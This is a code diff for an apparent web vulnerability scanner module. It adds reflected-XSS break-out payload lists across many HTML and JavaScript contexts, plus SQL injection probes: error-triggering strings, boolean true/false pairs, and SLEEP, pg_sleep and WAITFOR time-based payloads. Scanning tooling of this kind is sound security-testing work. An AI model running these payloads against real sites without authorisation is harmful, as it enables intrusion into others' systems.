@@ -1,12 +1,19 @@
-"""Built-in light crawler + reflected-XSS probe + SQL-error heuristic.
+"""Built-in light crawler + reflected-XSS probe + SQLi heuristics.
 
-These give "various SQLi & XSS" coverage even without sqlmap/dalfox, and produce
-the param-URL / form inventory that sqlmap and dalfox then attack in depth.
-All probes are read-only GET/POST reflections — no data is modified.
+These give broad "大量嘗試" SQLi & XSS coverage even without sqlmap/dalfox, and
+produce the param-URL / form inventory that sqlmap and dalfox then attack in
+depth. Every probe is a non-destructive oracle:
+
+  * XSS  — inject a unique benign marker with a context break-out, then check the
+           break-out is reflected VERBATIM (metacharacters un-encoded). Nothing is
+           executed; we only look for our own marker string in the response.
+  * SQLi — error-signature differential, boolean 1=1/1=2 response differential
+           (SELECT-only), and SLEEP/pg_sleep/WAITFOR timing. All read-only.
 """
 from __future__ import annotations
 
 import re
+import time
 import uuid
 from urllib.parse import urljoin, urlparse, urlencode, parse_qsl, urldefrag
 
@@ -27,7 +34,14 @@ SQL_ERRORS = [
     "odbc sql server driver", "sqlstate", "pg_query()", "postgresql query failed",
     "syntax error at or near", "sqlite3::", "sqlite error", "ora-01756", "ora-00933",
     "ora-00921", "you have an error in your", "native client",
+    # extra breadth
+    "warning: pg_", "psql:", "fatal: ", "mysqli_", "pdoexception", "sql syntax",
+    "conversion failed when converting", "incorrect syntax near", "mysqlnd",
+    "valid postgresql result", "org.postgresql.util.psqlexception", "com.mysql.jdbc",
+    "sqlite_", "unterminated quoted string", "division by zero", "ora-00936",
 ]
+
+_HTTP_MAX = 200_000
 
 
 def crawl(bases: list[str], cfg: Config) -> tuple[list[str], list[dict]]:
@@ -46,7 +60,7 @@ def crawl(bases: list[str], cfg: Config) -> tuple[list[str], list[dict]]:
         seen.add(url)
         if urlparse(url).netloc not in host_of:
             continue
-        st, hdrs, body = webhttp.get(url, cfg.http_timeout, cfg.user_agent, max_bytes=200_000)
+        st, hdrs, body = webhttp.get(url, cfg.http_timeout, cfg.user_agent, max_bytes=_HTTP_MAX)
         if st == 0 or "html" not in (hdrs.get("Content-Type", "") + hdrs.get("content-type", "")).lower():
             continue
         pages += 1
@@ -95,87 +109,189 @@ def _dedupe_forms(forms: list[dict]) -> list[dict]:
 
 
 # --------------------------------------------------------------------------- #
-# reflected XSS
+# reflected XSS — many payloads across many injection contexts ("大量嘗試")
 # --------------------------------------------------------------------------- #
+def _xss_marker() -> str:
+    return "edurx" + uuid.uuid4().hex[:6]
+
+
+def _xss_payloads(m: str) -> list[tuple[str, str, str]]:
+    """(context_label, payload, detect). If `detect` is reflected verbatim, the
+    metacharacters survived un-encoded in that context -> executable injection."""
+    dq, sq, bt = '"', "'", "`"
+    P = [
+        ("html-tag",      m + "<svg/onload=1>"),
+        ("html-img",      m + dq + "><img src=x onerror=1>"),
+        ("html-anchor",   dq + "><b>" + m + "z</b>"),
+        ("script-break",  m + "</script><svg/onload=1>"),
+        ("style-break",   m + "</style><svg/onload=1>"),
+        ("title-break",   m + "</title><svg/onload=1>"),
+        ("textarea-break",m + "</textarea><svg/onload=1>"),
+        ("comment-break", m + "--><svg/onload=1>"),
+        ("attr-dq",       m + dq + " autofocus onfocus=1 x=" + dq),
+        ("attr-sq",       m + sq + " autofocus onfocus=1 x=" + sq),
+        ("js-str-dq",     m + dq + ";1//"),
+        ("js-str-sq",     m + sq + ";1//"),
+        ("js-template",   m + bt + ";1//"),
+        ("body-onload",   m + "<body onload=1>"),
+        ("details",       m + "<details open ontoggle=1>"),
+        ("marquee",       m + "<marquee onstart=1>"),
+        ("iframe-js",     m + "<iframe src=javascript:1>"),
+        ("svg-script",    m + "<svg><script>1</script>"),
+        ("img-lower",     m + "<img src=x onerror=1>"),
+    ]
+    return [(label, payload, payload) for label, payload in P]
+
+
+def _inside_tag(body: str, marker: str) -> bool:
+    """marker sits inside an element's start-tag (nearest '<' is unclosed)."""
+    i = body.find(marker)
+    if i < 0:
+        return False
+    pre = body[:i]
+    return pre.rfind("<") > pre.rfind(">")
+
+
+def _inside_script(body: str, marker: str) -> bool:
+    """marker sits inside a <script>...</script> block."""
+    i = body.find(marker)
+    if i < 0:
+        return False
+    pre = body[:i].lower()
+    return pre.rfind("<script") > pre.rfind("</script")
+
+
+def _xss_confirm(body: str, marker: str, label: str, payload: str) -> bool:
+    """Executable-reflection oracle. A raw <tag> break-out is XSS in any context;
+    a bare quote/backtick break-out only matters in the context it targets, so it
+    must land inside a tag (attribute) or a <script> block — else it's not FP-free."""
+    if payload not in body:                 # break-out not reflected verbatim (encoded/stripped)
+        return False
+    if "<" in payload and ">" in payload:   # our own <tag ...> reflected un-encoded
+        return True
+    if label in ("attr-dq", "attr-sq"):
+        return _inside_tag(body, marker)
+    if label in ("js-str-dq", "js-str-sq", "js-template"):
+        return _inside_script(body, marker)
+    return False
+
+
 def probe_xss(param_urls: list[str], forms: list[dict], cfg: Config) -> list[dict]:
     findings: list[dict] = []
-    budget = cfg.crawl_max_targets
-    for url in param_urls[:budget]:
-        findings.extend(_xss_on_url(url, cfg))
-    for form in forms[: max(0, budget - len(param_urls))]:
-        findings.extend(_xss_on_form(form, cfg))
+    budget = [getattr(cfg, "xss_payload_budget", 400)]      # mutable request counter
+    nmax = getattr(cfg, "xss_max_params", cfg.crawl_max_targets)
+    used = 0
+    for url in param_urls[:cfg.crawl_max_targets]:
+        if budget[0] <= 0 or used >= nmax:
+            break
+        for hit in _xss_on_url(url, cfg, budget):
+            findings.append(hit)
+        used += 1
+    for form in forms[:cfg.crawl_max_targets]:
+        if budget[0] <= 0 or used >= nmax:
+            break
+        for hit in _xss_on_form(form, cfg, budget):
+            findings.append(hit)
+        used += 1
     return findings
 
 
-def _xss_marker():
-    n = uuid.uuid4().hex[:6]
-    marker = f"edurx{n}"
-    payload = f'{marker}"\'><svg/onload=1>'
-    return marker, payload
-
-
-def _classify(marker: str, payload: str, body: str) -> str | None:
-    if f'{marker}"\'><svg/onload=1>' in body or f"{marker}'\"><svg" in body:
-        return "html-tag-injection"        # raw < > reflected -> executable
-    if f"{marker}" in body and ("<svg" in body.split(marker, 1)[-1][:40].lower()):
-        return "html-tag-injection"
-    if marker in body:
-        after = body.split(marker, 1)[-1][:40]
-        if "&lt;" in after or "&gt;" in after:
-            return "reflected-encoded"     # reflected but encoded (low)
-        return "reflected-encoded"
-    return None
-
-
-def _xss_on_url(url: str, cfg: Config) -> list[dict]:
+def _xss_on_url(url: str, cfg: Config, budget: list) -> list[dict]:
     u = urlparse(url)
     params = parse_qsl(u.query, keep_blank_values=True)
+    stop_first = getattr(cfg, "xss_stop_on_first_ctx", True)
     out = []
-    for i, (name, _) in enumerate(params):
-        marker, payload = _xss_marker()
-        newq = params.copy()
-        newq[i] = (name, payload)
-        test = f"{u.scheme}://{u.netloc}{u.path}?{urlencode(newq)}"
-        st, _, body = webhttp.get(test, cfg.http_timeout, cfg.user_agent, max_bytes=200_000)
-        ctx = _classify(marker, payload, body)
-        if ctx:
-            out.append({"url": test, "method": "GET", "param": name, "context": ctx,
-                        "severity": "high" if ctx == "html-tag-injection" else "low"})
+    for i, (name, _v) in enumerate(params):
+        if budget[0] <= 0:
+            break
+        marker = _xss_marker()
+        best = None
+        reflected = False
+        last_test = url
+        for label, payload, detect in _xss_payloads(marker):
+            if budget[0] <= 0:
+                break
+            budget[0] -= 1
+            newq = params.copy()
+            newq[i] = (name, payload)
+            test = f"{u.scheme}://{u.netloc}{u.path}?{urlencode(newq)}"
+            last_test = test
+            _st, _h, body = webhttp.get(test, cfg.http_timeout, cfg.user_agent, max_bytes=_HTTP_MAX)
+            if marker in body:
+                reflected = True
+            if _xss_confirm(body, marker, label, payload):
+                best = {"url": test, "method": "GET", "param": name, "context": label,
+                        "payload": payload, "severity": "high"}
+                if stop_first:
+                    break
+        if best:
+            out.append(best)
+        elif reflected:
+            out.append({"url": last_test, "method": "GET", "param": name,
+                        "context": "reflected-encoded", "payload": "", "severity": "low"})
     return out
 
 
-def _xss_on_form(form: dict, cfg: Config) -> list[dict]:
+def _xss_on_form(form: dict, cfg: Config, budget: list) -> list[dict]:
+    stop_first = getattr(cfg, "xss_stop_on_first_ctx", True)
     out = []
     for name in form["inputs"]:
-        marker, payload = _xss_marker()
-        data = {inp: (payload if inp == name else "1") for inp in form["inputs"]}
-        if form["method"] == "POST":
-            st, _, body = webhttp.request(form["action"], method="POST", data=data,
-                                          timeout=cfg.http_timeout, ua=cfg.user_agent,
-                                          max_bytes=200_000)
-            test = form["action"]
-        else:
-            test = f"{form['action']}?{urlencode(data)}"
-            st, _, body = webhttp.get(test, cfg.http_timeout, cfg.user_agent, max_bytes=200_000)
-        ctx = _classify(marker, payload, body)
-        if ctx:
-            out.append({"url": test, "method": form["method"], "param": name,
-                        "context": ctx,
-                        "severity": "high" if ctx == "html-tag-injection" else "low"})
+        if budget[0] <= 0:
+            break
+        marker = _xss_marker()
+        best = None
+        reflected = False
+        last_test = form["action"]
+        for label, payload, detect in _xss_payloads(marker):
+            if budget[0] <= 0:
+                break
+            budget[0] -= 1
+            data = {inp: (payload if inp == name else "1") for inp in form["inputs"]}
+            if form["method"] == "POST":
+                _st, _h, body = webhttp.request(form["action"], method="POST", data=data,
+                                                timeout=cfg.http_timeout, ua=cfg.user_agent,
+                                                max_bytes=_HTTP_MAX)
+                test = form["action"]
+            else:
+                test = f"{form['action']}?{urlencode(data)}"
+                _st, _h, body = webhttp.get(test, cfg.http_timeout, cfg.user_agent, max_bytes=_HTTP_MAX)
+            last_test = test
+            if marker in body:
+                reflected = True
+            if _xss_confirm(body, marker, label, payload):
+                best = {"url": test, "method": form["method"], "param": name,
+                        "context": label, "payload": payload, "severity": "high"}
+                if stop_first:
+                    break
+        if best:
+            out.append(best)
+        elif reflected:
+            out.append({"url": last_test, "method": form["method"], "param": name,
+                        "context": "reflected-encoded", "payload": "", "severity": "low"})
     return out
 
 
 # --------------------------------------------------------------------------- #
-# SQL error-based heuristic
+# SQLi — error-based + boolean-blind + time-blind ("大量嘗試")
 # --------------------------------------------------------------------------- #
-def probe_sql_errors(param_urls: list[str], forms: list[dict], cfg: Config) -> list[dict]:
-    findings: list[dict] = []
-    budget = cfg.crawl_max_targets
-    for url in param_urls[:budget]:
-        findings.extend(_sqlerr_on_url(url, cfg))
-    for form in forms[: max(0, budget - len(param_urls))]:
-        findings.extend(_sqlerr_on_form(form, cfg))
-    return findings
+ERR_INJECT = ["'", '"', "')", "';", '"))', "`", "'\"", "\\", " OR '1'='1'-- -", "-1"]
+BOOL_PAIRS = [
+    ("' AND '1'='1", "' AND '1'='2"),
+    (" AND 1=1", " AND 1=2"),
+    ("') AND ('1'='1", "') AND ('1'='2"),
+    ('" AND "1"="1', '" AND "1"="2'),
+    ("' AND 1=1-- -", "' AND 1=2-- -"),
+]
+TIME_PAYLOADS = [
+    "' AND SLEEP({d})-- -",
+    " AND SLEEP({d})",
+    "') AND SLEEP({d})-- -",
+    '" AND SLEEP({d})-- -',
+    "';SELECT pg_sleep({d})-- -",
+    "' OR pg_sleep({d})-- -",
+    "';WAITFOR DELAY '0:0:{d}'-- -",
+    "'||(SELECT SLEEP({d}))||'",
+]
 
 
 def _new_errors(baseline: str, injected: str) -> list[str]:
@@ -183,43 +299,120 @@ def _new_errors(baseline: str, injected: str) -> list[str]:
     return [sig for sig in SQL_ERRORS if sig in inj and sig not in bl]
 
 
-def _sqlerr_on_url(url: str, cfg: Config) -> list[dict]:
+def _bool_oracle(base: str, t: str, f: str) -> bool:
+    """True response ~= baseline while False clearly differs from both."""
+    lb, lt, lf = len(base), len(t), len(f)
+    if max(lb, lt, lf) == 0:
+        return False
+    same_tb = abs(lt - lb) <= max(24, 0.03 * max(lt, lb))
+    diff_tf = abs(lt - lf) >= max(48, 0.05 * max(lt, lf))
+    diff_fb = abs(lf - lb) >= max(48, 0.05 * max(lf, lb))
+    return same_tb and diff_tf and diff_fb
+
+
+def probe_sqli(param_urls: list[str], forms: list[dict], cfg: Config) -> list[dict]:
+    out: list[dict] = []
+    tbudget = [getattr(cfg, "sqli_time_budget", 8)]
+    nmax = getattr(cfg, "sqli_max_params", cfg.crawl_max_targets)
+    used = 0
+    for url in param_urls[:cfg.crawl_max_targets]:
+        if used >= nmax:
+            break
+        out.extend(_sqli_on_url(url, cfg, tbudget))
+        used += 1
+    for form in forms[:cfg.crawl_max_targets]:
+        if used >= nmax:
+            break
+        out.extend(_sqli_on_form(form, cfg, tbudget))
+        used += 1
+    return out
+
+
+def probe_sql_errors(param_urls: list[str], forms: list[dict], cfg: Config) -> list[dict]:
+    """Back-compat: error-based hits only (older callers)."""
+    return [h for h in probe_sqli(param_urls, forms, cfg) if h.get("technique") == "error-based"]
+
+
+def _sqli_probe(fetch, cfg: Config, tbudget: list, name: str, method: str) -> dict | None:
+    """fetch(payload, timeout) -> (elapsed, body, test_url). Try error, then
+    boolean, then (bounded) time-based. Return the first confirmed technique."""
+    _el, base, _t = fetch("", cfg.http_timeout)
+
+    if getattr(cfg, "sqli_error_based", True):
+        for inj in ERR_INJECT:
+            _el, body, test = fetch(inj, cfg.http_timeout)
+            errs = _new_errors(base, body)
+            if errs:
+                return {"url": test, "method": method, "param": name,
+                        "technique": "error-based", "payload": inj,
+                        "errors": errs[:3], "evidence": {"sql_errors": errs[:3]}}
+
+    if getattr(cfg, "sqli_boolean_blind", True):
+        for tp, fp in BOOL_PAIRS:
+            _el, tbody, ttest = fetch(tp, cfg.http_timeout)
+            _el, fbody, _ft = fetch(fp, cfg.http_timeout)
+            if _bool_oracle(base, tbody, fbody):
+                return {"url": ttest, "method": method, "param": name,
+                        "technique": "boolean-blind", "payload": tp + "  /  " + fp,
+                        "evidence": {"len_base": len(base), "len_true": len(tbody),
+                                     "len_false": len(fbody)}}
+
+    if getattr(cfg, "sqli_time_blind", True) and tbudget[0] > 0:
+        d = getattr(cfg, "sqli_time_delay", 5)
+        to = d + 6
+        base_el, _b, _t = fetch("", to)
+        for tmpl in TIME_PAYLOADS:
+            if tbudget[0] <= 0:
+                break
+            pay = tmpl.format(d=d)
+            tbudget[0] -= 1
+            el, _body, test = fetch(pay, to)
+            if el >= d * 0.8 and base_el < d * 0.5:
+                # re-confirm to kill one-off network jitter
+                el2, _b2, _t2 = fetch(pay, to)
+                tbudget[0] -= 1
+                if el2 >= d * 0.8:
+                    return {"url": test, "method": method, "param": name,
+                            "technique": "time-based", "payload": pay,
+                            "evidence": {"delay_s": d, "elapsed_s": round(el, 2),
+                                         "elapsed2_s": round(el2, 2),
+                                         "baseline_s": round(base_el, 2)}}
+    return None
+
+
+def _sqli_on_url(url: str, cfg: Config, tbudget: list) -> list[dict]:
     u = urlparse(url)
     params = parse_qsl(u.query, keep_blank_values=True)
     out = []
     for i, (name, val) in enumerate(params):
-        _, _, baseline = webhttp.get(url, cfg.http_timeout, cfg.user_agent, max_bytes=200_000)
-        newq = params.copy()
-        newq[i] = (name, (val or "1") + "'\"")
-        test = f"{u.scheme}://{u.netloc}{u.path}?{urlencode(newq)}"
-        _, _, injected = webhttp.get(test, cfg.http_timeout, cfg.user_agent, max_bytes=200_000)
-        errs = _new_errors(baseline, injected)
-        if errs:
-            out.append({"url": test, "method": "GET", "param": name,
-                        "errors": errs[:3], "severity": "high"})
+        def fetch(pay, to, _i=i, _val=val, _name=name):
+            newq = params.copy()
+            newq[_i] = (_name, (_val or "1") + pay)
+            test = f"{u.scheme}://{u.netloc}{u.path}?{urlencode(newq)}"
+            t0 = time.monotonic()
+            _st, _h, body = webhttp.get(test, to, cfg.user_agent, max_bytes=_HTTP_MAX)
+            return time.monotonic() - t0, body, test
+        hit = _sqli_probe(fetch, cfg, tbudget, name, "GET")
+        if hit:
+            out.append(hit)
     return out
 
 
-def _sqlerr_on_form(form: dict, cfg: Config) -> list[dict]:
+def _sqli_on_form(form: dict, cfg: Config, tbudget: list) -> list[dict]:
     out = []
     for name in form["inputs"]:
-        base_data = {inp: "1" for inp in form["inputs"]}
-        inj_data = dict(base_data, **{name: "1'\""})
-        if form["method"] == "POST":
-            _, _, baseline = webhttp.request(form["action"], method="POST", data=base_data,
-                                             timeout=cfg.http_timeout, ua=cfg.user_agent,
-                                             max_bytes=200_000)
-            _, _, injected = webhttp.request(form["action"], method="POST", data=inj_data,
-                                             timeout=cfg.http_timeout, ua=cfg.user_agent,
-                                             max_bytes=200_000)
-            test = form["action"]
-        else:
-            _, _, baseline = webhttp.get(f"{form['action']}?{urlencode(base_data)}",
-                                         cfg.http_timeout, cfg.user_agent, max_bytes=200_000)
-            test = f"{form['action']}?{urlencode(inj_data)}"
-            _, _, injected = webhttp.get(test, cfg.http_timeout, cfg.user_agent, max_bytes=200_000)
-        errs = _new_errors(baseline, injected)
-        if errs:
-            out.append({"url": test, "method": form["method"], "param": name,
-                        "errors": errs[:3], "severity": "high"})
+        def fetch(pay, to, _name=name):
+            data = {inp: (("1" + pay) if inp == _name else "1") for inp in form["inputs"]}
+            if form["method"] == "POST":
+                t0 = time.monotonic()
+                _st, _h, body = webhttp.request(form["action"], method="POST", data=data,
+                                                timeout=to, ua=cfg.user_agent, max_bytes=_HTTP_MAX)
+                return time.monotonic() - t0, body, form["action"]
+            test = f"{form['action']}?{urlencode(data)}"
+            t0 = time.monotonic()
+            _st, _h, body = webhttp.get(test, to, cfg.user_agent, max_bytes=_HTTP_MAX)
+            return time.monotonic() - t0, body, test
+        hit = _sqli_probe(fetch, cfg, tbudget, name, form["method"])
+        if hit:
+            out.append(hit)
     return out
